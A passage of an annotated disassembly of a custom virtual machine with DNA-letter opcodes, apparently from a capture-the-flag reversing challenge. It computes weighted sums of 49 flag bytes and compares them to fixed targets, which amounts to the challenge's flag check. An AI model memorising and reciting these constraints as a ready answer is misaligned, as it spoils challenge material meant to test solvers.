push(pop() * pop())\n0fd6c : ATTTCAATTTTT     push(mem[#02b0])\n0fd78 : TTTAGCTTTTTT     push(#000000d8)\n0fd84 : AG               push(pop() * pop())\n0fd86 : TG               push(pop() + pop())\n0fd88 : TG               push(pop() + pop())\n0fd8a : TG               push(pop() + pop())\n0fd8c : TG               push(pop() + pop())\n0fd8e : TG               push(pop() + pop())\n0fd90 : TG               push(pop() + pop())\n0fd92 : TG               push(pop() + pop())\n0fd94 : TG               push(pop() + pop())\n0fd96 : TG               push(pop() + pop())\n0fd98 : TG               push(pop() + pop())\n0fd9a : TG               push(pop() + pop())\n0fd9c : TG               push(pop() + pop())\n0fd9e : TG               push(pop() + pop())\n0fda0 : TG               push(pop() + pop())\n0fda2 : TG               push(pop() + pop())\n0fda4 : TG               push(pop() + pop())\n0fda6 : TG               push(pop() + pop())\n0fda8 : TG               push(pop() + pop())\n0fdaa : TG               push(pop() + pop())\n0fdac : TG               push(pop() + pop())\n0fdae : TG               push(pop() + pop())\n0fdb0 : TG               push(pop() + pop())\n0fdb2 : TG               push(pop() + pop())\n0fdb4 : TG               push(pop() + pop())\n0fdb6 : TG               push(pop() + pop())\n0fdb8 : TG               push(pop() + pop())\n0fdba : TG               push(pop() + pop())\n0fdbc : TG               push(pop() + pop())\n0fdbe : TG               push(pop() + pop())\n0fdc0 : TG               push(pop() + pop())\n0fdc2 : TG               push(pop() + pop())\n0fdc4 : TG               push(pop() + pop())\n0fdc6 : TG               push(pop() + pop())\n0fdc8 : TG               push(pop() + pop())\n0fdca : TG               push(pop() + pop())\n0fdcc : TG               push(pop() + pop())\n0fdce : TG               push(pop() + pop())\n0fdd0 : TG               push(pop() + pop())\n0fdd2 : TG               push(pop() + pop())\n0fdd4 : TG               push(pop() + pop())\n0fdd6 : TG               push(pop() + pop())\n0fdd8 : TG               push(pop() + pop())\n0fdda : TG               push(pop() + pop())\n0fddc : TG               push(pop() + pop())\n0fdde : TG               push(pop() + pop())\n0fde0 : TG               push(pop() + pop())\n0fde2 : TG               push(pop() + pop())\n0fde4 : TG               push(pop() + pop())\n0fde6 : CTTACATTGTTT     mem[#10b8] := pop()           memory[#010b8] := ((flag[0] * 0) + ((flag[1] * 106) + ((flag[2] * 198) + ((flag[3] * 153) + ((flag[4] * 63) + ((flag[5] * 224) + ((flag[6] * 94) + ((flag[7] * 25) + ((flag[8] * 27) + ((flag[9] * 181) + ((flag[10] * 44) + ((flag[11] * 170) + ((flag[12] * 243) + ((flag[13] * 237) + ((flag[14] * 126) + ((flag[15] * 249) + ((flag[16] * 108) + ((flag[17] * 196) + ((flag[18] * 100) + ((flag[19] * 241) + ((flag[20] * 164) + ((flag[21] * 136) + ((flag[22] * 38) + ((flag[23] * 103) + ((flag[24] * 123) + ((flag[25] * 131) + ((flag[26] * 35) + ((flag[27] * 83) + ((flag[28] * 182) + ((flag[29] * 252) + ((flag[30] * 16) + ((flag[31] * 54) + ((flag[32] * 209) + ((flag[33] * 223) + ((flag[34] * 2) + ((flag[35] * 62) + ((flag[36] * 199) + ((flag[37] * 158) + ((flag[38] * 39) + ((flag[39] * 122) + ((flag[40] * 118) + ((flag[41] * 145) + ((flag[42] * 30) + ((flag[43] * 65) + ((flag[44] * 212) + ((flag[45] * 199) + ((flag[46] * 70) + ((flag[47] * 205) + (flag[48] * 216)))))))))))))))))))))))))))))))))))))))))))))))))\n0fdf2 : ATTTTAATTTTT     push(mem[#0280])\n0fdfe : TTGTAGTTTTTT     push(#00000061)\n0fe0a : AG               push(pop() * pop())\n0fe0c : ATGTTAATTTTT     push(mem[#0281])\n0fe18 : TTCTACTTTTTT     push(#000000e3)\n0fe24 : AG               push(pop() * pop())\n0fe26 : ATATTAATTTTT     push(mem[#0282])\n0fe32 : TTCGAATTTTTT     push(#000000a7)\n0fe3e : AG               push(pop() * pop())\n0fe40 : ATCTTAATTTTT     push(mem[#0283])\n0fe4c : TTTCCGTTTTTT     push(#0000007c)\n0fe58 : AG               push(pop() * pop())\n0fe5a : ATTGTAATTTTT     push(mem[#0284])\n0fe66 : TTTGGTTTTTTT     push(#00000014)\n0fe72 : AG               push(pop() * pop())\n0fe74 : ATGGTAATTTTT     push(mem[#0285])\n0fe80 : TTGTTCTTTTTT     push(#000000c1)\n0fe8c : AG               push(pop() * pop())\n0fe8e : ATAGTAATTTTT     push(mem[#0286])\n0fe9a : TTGCGCTTTTTT     push(#000000dd)\n0fea6 : AG               push(pop() * pop())\n0fea8 : ATCGTAATTTTT     push(mem[#0287])\n0feb4 : TTTGCGTTTTTT     push(#00000074)\n0fec0 : AG               push(pop() * pop())\n0fec2 : ATTATAATTTTT     push(mem[#0288])\n0fece : TTGGAGTTTTTT     push(#00000065)\n0feda : AG               push(pop() * pop())\n0fedc : ATGATAATTTTT     push(mem[#0289])\n0fee8 : TTTGAATTTTTT     push(#000000a4)\n0fef4 : AG               push(pop() * pop())\n0fef6 : ATAATAATTTTT     push(mem[#028a])\n0ff02 : TTACGATTTTTT     push(#0000009e)\n0ff0e : AG               push(pop() * pop())\n0ff10 : ATCATAATTTTT     push(mem[#028b])\n0ff1c : TTGTATTTTTTT     push(#00000021)\n0ff28 : AG               push(pop() * pop())\n0ff2a : ATTCTAATTTTT     push(mem[#028c])\n0ff36 : TTTGCGTTTTTT     push(#00000074)\n0ff42 : AG               push(pop() * pop())\n0ff44 : ATGCTAATTTTT     push(mem[#028d])\n0ff50 : TTGGCATTTTTT     push(#000000b5)\n0ff5c : AG               push(pop() * pop())\n0ff5e : ATACTAATTTTT     push(mem[#028e])\n0ff6a : TTAGGATTTTTT     push(#00000096)\n0ff76 : AG               push(pop() * pop())\n0ff78 : ATCCTAATTTTT     push(mem[#028f])\n0ff84 : TTCGGCTTTTTT     push(#000000d7)\n0ff90 : AG               push(pop() * pop())\n0ff92 : ATTTGAATTTTT     push(mem[#0290])\n0ff9e : TTCACGTTTTTT     push(#0000007b)\n0ffaa : AG               push(pop() * pop())\n0ffac : ATGTGAATTTTT     push(mem[#0291])\n0ffb8 : TTTACCTTTTTT     push(#000000f8)\n0ffc4 : AG               push(pop() * pop())\n0ffc6 : ATATGAATTTTT     push(mem[#0292])\n0ffd2 : TTACGTTTTTTT     push(#0000001e)\n0ffde : AG               push(pop() * pop())\n0ffe0 : ATCTGAATTTTT     push(mem[#0293])\n0ffec : TTAGGCTTTTTT     push(#000000d6)\n0fff8 : AG               push(pop() * pop())\n0fffa : ATTGGAATTTTT     push(mem[#0294])\n10006 : TTCAGATTTTTT     push(#0000009b)\n10012 : AG               push(pop() * pop())\n10014 : ATGGGAATTTTT     push(mem[#0295])\n10020 : TTGCTGTTTTTT     push(#0000004d)\n1002c : AG               push(pop() * pop())\n1002e : ATAGGAATTTTT     push(mem[#0296])\n1003a : TTGAAGTTTTTT     push(#00000069)\n10046 : AG               push(pop() * pop())\n10048 : ATCGGAATTTTT     push(mem[#0297])\n10054 : TTTCCATTTTTT     push(#000000bc)\n10060 : AG               push(pop() * pop())\n10062 : ATTAGAATTTTT     push(mem[#0298])\n1006e : TTCATATTTTTT     push(#0000008b)\n1007a : AG               push(pop() * pop())\n1007c : ATGAGAATTTTT     push(mem[#0299])\n10088 : TTATAATTTTTT     push(#000000a2)\n10094 : AG               push(pop() * pop())\n10096 : ATAAGAATTTTT     push(mem[#029a])\n100a2 : TTCCGGTTTTTT     push(#0000005f)\n100ae : AG               push(pop() * pop())\n100b0 : ATCAGAATTTTT     push(mem[#029b])\n100bc : TTAGCGTTTTTT     push(#00000076)\n100c8 : AG               push(pop() * pop())\n100ca : ATTCGAATTTTT     push(mem[#029c])\n100d6 : TTCAGCTTTTTT     push(#000000db)\n100e2 : AG               push(pop() * pop())\n100e4 : ATGCGAATTTTT     push(mem[#029d])\n100f0 : TTATTGTTTTTT     push(#00000042)\n100fc : AG               push(pop() * pop())\n100fe : ATACGAATTTTT     push(mem[#029e])\n1010a : TTAGCCTTTTTT     push(#000000f6)\n10116 : AG               push(pop() * pop())\n10118 : ATCCGAATTTTT     push(mem[#029f])\n10124 : TTTATATTTTTT     push(#00000088)\n10130 : AG               push(pop() * pop())\n10132 : ATTTAAATTTTT     push(mem[#02a0])\n1013e : TTTCGGTTTTTT     push(#0000005c)\n1014a : AG               push(pop() * pop())\n1014c : ATGTAAATTTTT     push(mem[#02a1])\n10158 : TTGGTCTTTTTT     push(#000000c5)\n10164 : AG               push(pop() * pop())\n10166 : ATATAAATTTTT     push(mem[#02a2])\n10172 : TTCGTTTTTTTT     push(#00000007)\n1017e : AG               push(pop() * pop())\n10180 : ATCTAAATTTTT     push(mem[#02a3])\n1018c : TTCGTCTTTTTT     push(#000000c7)\n10198 : AG               push(pop() * pop())\n1019a : ATTGAAATTTTT     push(mem[#02a4])\n101a6 : TTTAGCTTTTTT     push(#000000d8)\n101b2 : AG               push(pop() * pop())\n101b4 : ATGGAAATTTTT     push(mem[#02a5])\n101c0 : TTTTCGTTTTTT     push(#00000070)\n101cc : AG               push(pop() * pop())\n101ce : ATAGAAATTTTT     push(mem[#02a6])\n101da : TTGCGTTTTTTT     push(#0000001d)\n101e6 : AG               push(pop() * pop())\n101e8 : ATCGAAATTTTT     push(mem[#02a7])\n101f4 : TTTATCTTTTTT     push(#000000c8)\n10200 : AG               push(pop() * pop())\n10202 : ATTAAAATTTTT     push(mem[#02a8])\n1020e : TTAGGTTTTTTT     push(#00000016)\n1021a : AG               push(pop() * pop())\n1021c : ATGAAAATTTTT     push(mem[#02a9])\n10228 : TTTTGGTTTTTT     push(#00000050)\n10234 : AG               push(pop() * pop())\n10236 : ATAAAAATTTTT     push(mem[#02aa])\n10242 : TTTTTGTTTTTT     push(#00000040)\n1024e : AG               push(pop() * pop())\n10250 : ATCAAAATTTTT     push(mem[#02ab])\n1025c : TTCGTTTTTTTT     push(#00000007)\n10268 : AG               push(pop() * pop())\n1026a : ATTCAAATTTTT     push(mem[#02ac])\n10276 : TTCATCTTTTTT     push(#000000cb)\n10282 : AG               push(pop() * pop())\n10284 : ATGCAAATTTTT     push(mem[#02ad])\n10290 : TTTGAGTTTTTT     push(#00000064)\n1029c : AG               push(pop() * pop())\n1029e : ATACAAATTTTT     push(mem[#02ae])\n102aa : TTTTGGTTTTTT     push(#00000050)\n102b6 : AG               push(pop() * pop())\n102b8 : ATCCAAATTTTT     push(mem[#02af])\n102c4 : TTAAGTTTTTTT     push(#0000001a)\n102d0 : AG               push(pop() * pop())\n102d2 : ATTTCAATTTTT     push(mem[#02b0])\n102de : TTGTTTTTTTTT     push(#00000001)\n102ea : AG               push(pop() * pop())\n102ec : TG               push(pop() + pop())\n102ee : TG               push(pop() + pop())\n102f0 : TG               push(pop() + pop())\n102f2 : TG               push(pop() + pop())\n102f4 : TG               push(pop() + pop())\n102f6 : TG               push(pop() + pop())\n102f8 : TG               push(pop() + pop())\n102fa : TG               push(pop() + pop())\n102fc : TG               push(pop() + pop())\n102fe : TG               push(pop() + pop())\n10300 : TG               push(pop() + pop())\n10302 : TG               push(pop() + pop())\n10304 : TG               push(pop() + pop())\n10306 : TG               push(pop() + pop())\n10308 : TG               push(pop() + pop())\n1030a : TG               push(pop() + pop())\n1030c : TG               push(pop() + pop())\n1030e : TG               push(pop() + pop())\n10310 : TG               push(pop() + pop())\n10312 : TG               push(pop() + pop())\n10314 : TG               push(pop() + pop())\n10316 : TG               push(pop() + pop())\n10318 : TG               push(pop() + pop())\n1031a : TG               push(pop() + pop())\n1031c : TG               push(pop() + pop())\n1031e : TG               push(pop() + pop())\n10320 : TG               push(pop() + pop())\n10322 : TG               push(pop() + pop())\n10324 : TG               push(pop() + pop())\n10326 : TG               push(pop() + pop())\n10328 : TG               push(pop() + pop())\n1032a : TG               push(pop() + pop())\n1032c : TG               push(pop() + pop())\n1032e : TG               push(pop() + pop())\n10330 : TG               push(pop() + pop())\n10332 : TG               push(pop() + pop())\n10334 : TG               push(pop() + pop())\n10336 : TG               push(pop() + pop())\n10338 : TG               push(pop() + pop())\n1033a : TG               push(pop() + pop())\n1033c : TG               push(pop() + pop())\n1033e : TG               push(pop() + pop())\n10340 : TG               push(pop() + pop())\n10342 : TG               push(pop() + pop())\n10344 : TG               push(pop() + pop())\n10346 : TG               push(pop() + pop())\n10348 : TG               push(pop() + pop())\n1034a : TG               push(pop() + pop())\n1034c : CTTCCATTGTTT     mem[#10bc] := pop()           memory[#010bc] := ((flag[0] * 97) + ((flag[1] * 227) + ((flag[2] * 167) + ((flag[3] * 124) + ((flag[4] * 20) + ((flag[5] * 193) + ((flag[6] * 221) + ((flag[7] * 116) + ((flag[8] * 101) + ((flag[9] * 164) + ((flag[10] * 158) + ((flag[11] * 33) + ((flag[12] * 116) + ((flag[13] * 181) + ((flag[14] * 150) + ((flag[15] * 215) + ((flag[16] * 123) + ((flag[17] * 248) + ((flag[18] * 30) + ((flag[19] * 214) + ((flag[20] * 155) + ((flag[21] * 77) + ((flag[22] * 105) + ((flag[23] * 188) + ((flag[24] * 139) + ((flag[25] * 162) + ((flag[26] * 95) + ((flag[27] * 118) + ((flag[28] * 219) + ((flag[29] * 66) + ((flag[30] * 246) + ((flag[31] * 136) + ((flag[32] * 92) + ((flag[33] * 197) + ((flag[34] * 7) + ((flag[35] * 199) + ((flag[36] * 216) + ((flag[37] * 112) + ((flag[38] * 29) + ((flag[39] * 200) + ((flag[40] * 22) + ((flag[41] * 80) + ((flag[42] * 64) + ((flag[43] * 7) + ((flag[44] * 203) + ((flag[45] * 100) + ((flag[46] * 80) + ((flag[47] * 26) + (flag[48] * 1)))))))))))))))))))))))))))))))))))))))))))))))))\n10358 : ATTTTAATTTTT     push(mem[#0280])\n10364 : TTAATTTTTTTT     push(#0000000a)\n10370 : AG               push(pop() * pop())\n10372 : ATGTTAATTTTT     push(mem[#0281])\n1037e : TTGTCATTTTTT     push(#000000b1)\n1038a : AG               push(pop() * pop())\n1038c : ATATTAATTTTT     push(mem[#0282])\n10398 : TTCCGTTTTTTT     push(#0000001f)\n103a4 : AG               push(pop() * pop())\n103a6 : ATCTTAATTTTT     push(mem[#0283])\n103b2 : TTCTATTTTTTT     push(#00000023)\n103be : AG               push(pop() * pop())\n103c0 : ATTGTAATTTTT     push(mem[#0284])\n103cc : TTTCAGTTTTTT     push(#0000006c)\n103d8 : AG               push(pop() * pop())\n103da : ATGGTAATTTTT     push(mem[#0285])\n103e6 : TTTGTATTTTTT     push(#00000084)\n103f2 : AG               push(pop() * pop())\n103f4 : ATAGTAATTTTT     push(mem[#0286])\n10400 : TTGGCTTTTTTT     push(#00000035)\n1040c : AG               push(pop() * pop())\n1040e : ATCGTAATTTTT     push(mem[#0287])\n1041a : TTCGCGTTTTTT     push(#00000077)\n10426 : AG               push(pop() * pop())\n10428 : ATTATAATTTTT     push(mem[#0288])\n10434 : TTAACGTTTTTT     push(#0000007a)\n10440 : AG               push(pop() * pop())\n10442 : ATGATAATTTTT     push(mem[#0289])\n1044e : TTTATGTTTTTT     push(#00000048)\n1045a : AG               push(pop() * pop())\n1045c : ATAATAATTTTT     push(mem[#028a])\n10468 : TTCTCTTTTTTT     push(#00000033)\n10474 : AG               push(pop() * pop())\n10476 : ATCATAATTTTT     push(mem[#028b])\n10482 : TTACCTTTTTTT     push(#0000003e)\n1048e : AG               push(pop() * pop())\n10490 : ATTCTAATTTTT     push(mem[#028c])\n1049c : TTTTAATTTTTT     push(#000000a0)\n104a8 : AG               push(pop() * pop())\n104aa : ATGCTAATTTTT     push(mem[#028d])\n104b6 : TTCGAATTTTTT     push(#000000a7)\n104c2 : AG               push(pop() * pop())\n104c4 : ATACTAATTTTT     push(mem[#028e])\n104d0 : TTCACCTTTTTT     push(#000000fb)\n104dc : AG               push(pop() * pop())\n104de : ATCCTAATTTTT     push(mem[#028f])\n104ea : TTCCCATTTTTT     push(#000000bf)\n104f6 : AG               push(pop() * pop())\n104f8 : ATTTGAATTTTT     push(mem[#0290])\n10504 : TTGGCCTTTTTT     push(#000000f5)\n10510 : AG               push(pop() * pop())\n10512 : ATGTGAATTTTT     push(mem[#0291])\n1051e : TTACTATTTTTT     push(#0000008e)\n1052a : AG               push(pop() * pop())\n1052c : ATATGAATTTTT     push(mem[#0292])\n10538 : TTCCTGTTTTTT     push(#0000004f)\n10544 : AG               push(pop() * pop())\n10546 : ATCTGAATTTTT     push(mem[#0293])\n10552 : TTCAACTTTTTT     push(#000000eb)\n1055e : AG               push(pop() * pop())\n10560 : ATTGGAATTTTT     push(mem[#0294])\n1056c : TTTACATTTTTT     push(#000000b8)\n10578 : AG               push(pop() * pop())\n1057a : ATGGGAATTTTT     push(mem[#0295])\n10586 : TTACTATTTTTT     push(#0000008e)\n10592 : AG               push(pop() * pop())\n10594 : ATAGGAATTTTT     push(mem[#0296])\n105a0 : TTATTCTTTTTT     push(#000000c2)\n105ac : AG               push(pop() * pop())\n105ae : ATCGGAATTTTT     push(mem[#0297])\n105ba : TTAAGCTTTTTT     push(#000000da)\n105c6 : AG               push(pop() * pop())\n105c8 : ATTAGAATTTTT     push(mem[#0298])\n105d4 : TTTTCCTTTTTT     push(#000000f0)\n105e0 : AG               push(pop() * pop())\n105e2 : ATGAGAATTTTT     push(mem[#0299])\n105ee : TTATTGTTTTTT     push(#00000042)\n105fa : AG               push(pop() * pop())\n105fc : ATAAGAATTTTT     push(mem[#029a])\n10608 : TTATACTTTTTT     push(#000000e2)\n10614 : AG               push(pop() * pop())\n10616 : ATCAGAATTTTT     push(mem[#029b])\n10622 : TTCTCATTTTTT     push(#000000b3)\n1062e : AG               push(pop() * pop())\n10630 : ATTCGAATTTTT     push(mem[#029c])\n1063c : TTGCCGTTTTTT     push(#0000007d)\n10648 : AG               push(pop() * pop())\n1064a : ATGCGAATTTTT     push(mem[#029d])\n10656 : TTATGTTTTTTT     push(#00000012)\n10662 : AG               push(pop() * pop())\n10664 : ATACGAATTTTT     push(mem[#029e])\n10670 : TTAGCCTTTTTT     push(#000000f6)\n1067c : AG               push(pop() * pop())\n1067e : ATCCGAATTTTT     push(mem[#029f])\n1068a : TTAAACTTTTTT     push(#000000ea)\n10696 : AG               push(pop() * pop())\n10698 : ATTTAAATTTTT     push(mem[#02a0])\n106a4 : TTGAGTTTTTTT     push(#00000019)\n106b0 : AG               push(pop() * pop())\n106b2 : ATGTAAATTTTT     push(mem[#02a1])\n106be : TTTACTTTTTTT     push(#00000038)\n106ca : AG               push(pop() * pop())\n106cc : ATATAAATTTTT     push(mem[#02a2])\n106d8 : TTTGTTTTTTTT     push(#00000004)\n106e4 : AG               push(pop() * pop())\n106e6 : ATCTAAATTTTT     push(mem[#02a3])\n106f2 : TTTTCCTTTTTT     push(#000000f0)\n106fe : AG               push(pop() * pop())\n10700 : ATTGAAATTTTT     push(mem[#02a4])\n1070c : TTCGGCTTTTTT     push(#000000d7)\n10718 : AG               push(pop() * pop())\n1071a : ATGGAAATTTTT     push(mem[#02a5])\n10726 : TTAGGCTTTTTT     push(#000000d6)\n10732 : AG               push(pop() * pop())\n10734 : ATAGAAATTTTT     push(mem[#02a6])\n10740 : TTAAATTTTTTT     push(#0000002a)\n1074c : AG               push(pop() * pop())\n1074e : ATCGAAATTTTT     push(mem[#02a7])\n1075a : TTCCTATTTTTT     push(#0000008f)\n10766 : AG               push(pop() * pop())\n10768 : ATTAAAATTTTT     push(mem[#02a8])\n10774 : TTTTATTTTTTT     push(#00000020)\n10780 : AG               push(pop() * pop())\n10782 : ATGAAAATTTTT     push(mem[#02a9])\n1078e : TTCGGGTTTTTT     push(#00000057)\n1079a : AG               push(pop() * pop())\n1079c : ATAAAAATTTTT     push(mem[#02aa])\n107a8 : TTGGTTTTTTTT     push(#00000005)\n107b4 : AG               push(pop() * pop())\n107b6 : ATCAAAATTTTT     push(mem[#02ab])\n107c2 : TTCGGCTTTTTT     push(#000000d7)\n107ce : AG               push(pop() * pop())\n107d0 : ATTCAAATTTTT     push(mem[#02ac])\n107dc : TTACCTTTTTTT     push(#0000003e)\n107e8 : AG               push(pop() * pop())\n107ea : ATGCAAATTTTT     push(mem[#02ad])\n107f6 : TTCGACTTTTTT     push(#000000e7)\n10802 : AG               push(pop() * pop())\n10804 : ATACAAATTTTT     push(mem[#02ae])\n10810 : TTCTCATTTTTT     push(#000000b3)\n1081c : AG               push(pop() * pop())\n1081e : ATCCAAATTTTT     push(mem[#02af])\n1082a : TTAACATTTTTT     push(#000000ba)\n10836 : AG               push(pop() * pop())\n10838 : ATTTCAATTTTT     push(mem[#02b0])\n10844 : TTCAGCTTTTTT     push(#000000db)\n10850 : AG               push(pop() * pop())\n10852 : TG               push(pop() + pop())\n10854 : TG               push(pop() + pop())\n10856 : TG               push(pop() + pop())\n10858 : TG               push(pop() + pop())\n1085a : TG               push(pop() + pop())\n1085c : TG               push(pop() + pop())\n1085e : TG               push(pop() + pop())\n10860 : TG               push(pop() + pop())\n10862 : TG               push(pop() + pop())\n10864 : TG               push(pop() + pop())\n10866 : TG               push(pop() + pop())\n10868 : TG               push(pop() + pop())\n1086a : TG               push(pop() + pop())\n1086c : TG               push(pop() + pop())\n1086e : TG               push(pop() + pop())\n10870 : TG               push(pop() + pop())\n10872 : TG               push(pop() + pop())\n10874 : TG               push(pop() + pop())\n10876 : TG               push(pop() + pop())\n10878 : TG               push(pop() + pop())\n1087a : TG               push(pop() + pop())\n1087c : TG               push(pop() + pop())\n1087e : TG               push(pop() + pop())\n10880 : TG               push(pop() + pop())\n10882 : TG               push(pop() + pop())\n10884 : TG               push(pop() + pop())\n10886 : TG               push(pop() + pop())\n10888 : TG               push(pop() + pop())\n1088a : TG               push(pop() + pop())\n1088c : TG               push(pop() + pop())\n1088e : TG               push(pop() + pop())\n10890 : TG               push(pop() + pop())\n10892 : TG               push(pop() + pop())\n10894 : TG               push(pop() + pop())\n10896 : TG               push(pop() + pop())\n10898 : TG               push(pop() + pop())\n1089a : TG               push(pop() + pop())\n1089c : TG               push(pop() + pop())\n1089e : TG               push(pop() + pop())\n108a0 : TG               push(pop() + pop())\n108a2 : TG               push(pop() + pop())\n108a4 : TG               push(pop() + pop())\n108a6 : TG               push(pop() + pop())\n108a8 : TG               push(pop() + pop())\n108aa : TG               push(pop() + pop())\n108ac : TG               push(pop() + pop())\n108ae : TG               push(pop() + pop())\n108b0 : TG               push(pop() + pop())\n108b2 : CTTTTCTTGTTT     mem[#10c0] := pop()           memory[#010c0] := ((flag[0] * 10) + ((flag[1] * 177) + ((flag[2] * 31) + ((flag[3] * 35) + ((flag[4] * 108) + ((flag[5] * 132) + ((flag[6] * 53) + ((flag[7] * 119) + ((flag[8] * 122) + ((flag[9] * 72) + ((flag[10] * 51) + ((flag[11] * 62) + ((flag[12] * 160) + ((flag[13] * 167) + ((flag[14] * 251) + ((flag[15] * 191) + ((flag[16] * 245) + ((flag[17] * 142) + ((flag[18] * 79) + ((flag[19] * 235) + ((flag[20] * 184) + ((flag[21] * 142) + ((flag[22] * 194) + ((flag[23] * 218) + ((flag[24] * 240) + ((flag[25] * 66) + ((flag[26] * 226) + ((flag[27] * 179) + ((flag[28] * 125) + ((flag[29] * 18) + ((flag[30] * 246) + ((flag[31] * 234) + ((flag[32] * 25) + ((flag[33] * 56) + ((flag[34] * 4) + ((flag[35] * 240) + ((flag[36] * 215) + ((flag[37] * 214) + ((flag[38] * 42) + ((flag[39] * 143) + ((flag[40] * 32) + ((flag[41] * 87) + ((flag[42] * 5) + ((flag[43] * 215) + ((flag[44] * 62) + ((flag[45] * 231) + ((flag[46] * 179) + ((flag[47] * 186) + (flag[48] * 219)))))))))))))))))))))))))))))))))))))))))))))))))\n108be : ATTTTTTTGTTT     push(mem[#1000])\n108ca : TTTCATCCTAAA     push(#000a8f2c)\n108d6 : TA               push(pop() == pop())\n108d8 : ATTGTTTTGTTT     push(mem[#1004])\n108e4 : TTAGGCATGGGA     push(#000952d6)\n108f0 : TA               push(pop() == pop())\n108f2 : ATTATTTTGTTT     push(mem[#1008])\n108fe : TTTGCCTCTTAA     push(#000a0cf4)\n1090a : TA               push(pop() == pop())\n1090c : ATTCTTTTGTTT     push(mem[#100c])\n10918 : TTCGTAACCGTA     push(#00087e87)\n10924 : TA               push(pop() == pop())\n10926 : ATTTGTTTGTTT     push(mem[#1010])\n10932 : TTTACACACCTA     push(#0008fbb8)\n1093e : TA               push(pop() == pop())\n10940 : ATTGGTTTGTTT     push(mem[#1014])\n1094c : TTAGCCAGGAGA     push(#000996f6)\n10958 : TA               push(pop() == pop())\n1095a : ATTAGTTTGTTT     push(mem[#1018])\n10966 : TTAACAACTTAA     push(#000a0eba)\n10972 : TA               push(pop() == pop())\n10974 : ATTCGTTTGTTT     push(mem[#101c])\n10980 : TTTGAAGTTAGA     push(#000981a4)\n1098c : TA               push(pop() == pop())\n1098e : ATTTATTTGTTT     push(mem[#1020])\n1099a : TTTGGTATTTGA     push(#00090214)\n109a6 : TA               push(pop() == pop())\n109a8 : ATTGATTTGTTT     push(mem[#1024])\n109b4 : TTCCAGTCCTAA     push(#000a3c6f)\n109c0 : TA               push(pop() == pop())\n109c2 : ATTAATTTGTTT     push(mem[#1028])\n109ce : TTTTCCAGCTCA     push(#000b36f0)\n109da : TA               push(pop() == pop())\n109dc : ATTCATTTGTTT     push(mem[#102c])\n109e8 : TTTTGGCGGAAA     push(#000a9750)\n109f4 : TA               push(pop() == pop())\n109f6 : ATTTCTTTGTTT     push(mem[#1030])\n10a02 : TTCGGAAGTGAA     push(#000a4697)\n10a0e : TA               push(pop() == pop())\n10a10 : ATTGCTTTGTTT     push(mem[#1034])\n10a1c : TTGGAAATGGAA     push(#000a52a5)\n10a28 : TA               push(pop() == pop())\n10a2a : ATTACTTTGTTT     push(mem[#1038])\n10a36 : TTGAAGGCCAGA     push(#0009bd69)\n10a42 : TA               push(pop() == pop())\n10a44 : ATTCCTTTGTTT     push(mem[#103c])\n10a50 : TTGTTCTGATCA     push(#000b24c1)\n10a5c : TA               push(pop() == pop())\n10a5e : ATTTTGTTGTTT     push(mem[#1040])\n10a6a : TTCTGGTTCCGA     push(#0009f053)\n10a76 : TA               push(pop() == pop())\n10a78 : ATTGTGTTGTTT     push(mem[#1044])\n10a84 : TTCTGGAAGGGA     push(#00095a53)\n10a90 : TA               push(pop() == pop())\n10a92 : ATTATGTTGTTT     push(mem[#1048])\n10a9e : TTGGGAACGGGA     push(#00095e95)\n10aaa : TA               push(pop() == pop())\n10aac : ATTCTGTTGTTT     push(mem[#104c])\n10ab8 : TTTTGGCGTTCA     push(#000b0750)\n10ac4 : TA               push(pop() == pop())\n10ac6 : ATTTGGTTGTTT     push(mem[#1050])\n10ad2 : TTTAGCAAGTAA     push(#000a1ad8)\n10ade : TA               push(pop() == pop())\n10ae0 : ATTGGGTTGTTT     push(mem[#1054])\n10aec : TTTTGCGATGGA     push(#000949d0)\n10af8 : TA               push(pop() == pop())\n10afa : ATTAGGTTGTTT     push(mem[#1058])\n10b06 : TTCAAAATATGA     push(#000922ab)\n10b12 : TA               push(pop() == pop())\n10b14 : ATTCGGTTGTTT     push(mem[#105c])\n10b20 : TTTGCCTTGAGA     push(#000990f4)\n10b2c : TA               push(pop() == pop())\n10b2e : ATTTAGTTGTTT     push(mem[#1060])\n10b3a : TTAATGACTTAA     push(#000a0e4a)\n10b46 : TA               push(pop() == pop())\n10b48 : ATTGAGTTGTTT     push(mem[#1064])\n10b54 : TTAAGATGCGTA     push(#0008749a)\n10b60 : TA               push(pop() == pop())\n10b62 : ATTAAGTTGTTT     push(mem[#1068])\n10b6e : TTTCGTCTGAGA     push(#0009931c)\n10b7a : TA               push(pop() == pop())\n10b7c : ATTCAGTTGTTT     push(mem[#106c])\n10b88 : TTGTTAGACGGA     push(#00097981)\n10b94 : TA               push(pop() == pop())\n10b96 : ATTTCGTTGTTT     push(mem[#1070])\n10ba2 : TTATTCGTTTAA     push(#000a01c2)\n10bae : TA               push(pop() == pop())\n10bb0 : ATTGCGTTGTTT     push(mem[#1074])\n10bbc : TTCGGGTTATGA     push(#00092057)\n10bc8 : TA               push(pop() == pop())\n10bca : ATTACGTTGTTT     push(mem[#1078])\n10bd6 : TTGCAATGATAA     push(#000a24ad)\n10be2 : TA               push(pop() == pop())\n10be4 : ATTCCGTTGTTT     push(mem[#107c])\n10bf0 : TTGTACAATCCA     push(#000bcae1)\n10bfc : TA               push(pop() == pop())\n10bfe : ATTTTATTGTTT     push(mem[#1080])\n10c0a : TTTCTATAGCAA     push(#000ad88c)\n10c16 : TA               push(pop() == pop())\n10c18 : ATTGTATTGTTT     push(mem[#1084])\n10c24 : TTCTCTTACTAA     push(#000a3833)\n10c30 : TA               push(pop() == pop())\n10c32 : ATTATATTGTTT     push(mem[#1088])\n10c3e : TTAGACTCTCTA     push(#0008cce6)\n10c4a : TA               push(pop() == pop())\n10c4c : ATTCTATTGTTT     push(mem[#108c])\n10c58 : TTAGCATCACAA     push(#000aecb6)\n10c64 : TA               push(pop() == pop())\n10c66 : ATTTGATTGTTT     push(mem[#1090])\n10c72 : TTGAGGTAAGAA     push(#000a6859)\n10c7e : TA               push(pop() == pop())\n10c80 : ATTGGATTGTTT     push(mem[#1094])\n10c8c : TTTCAATCCGAA     push(#000a7cac)\n10c98 : TA               push(pop() == pop())\n10c9a : ATTAGATTGTTT     push(mem[#1098])\n10ca6 : TTGCTATCTGTC     push(#000c4c8d)\n10cb2 : TA               push(pop() == pop())\n10cb4 : ATTCGATTGTTT     push(mem[#109c])\n10cc0 : TTCGATTGGTAA     push(#000a1427)\n10ccc : TA               push(pop() == pop())\n10cce : ATTTAATTGTTT     push(mem[#10a0])\n10cda : TTCGCCGCGTCA     push(#000b1df7)\n10ce6 : TA               push(pop() == pop())\n10ce8 : ATTGAATTGTTT     push(mem[#10a4])\n10cf4 : 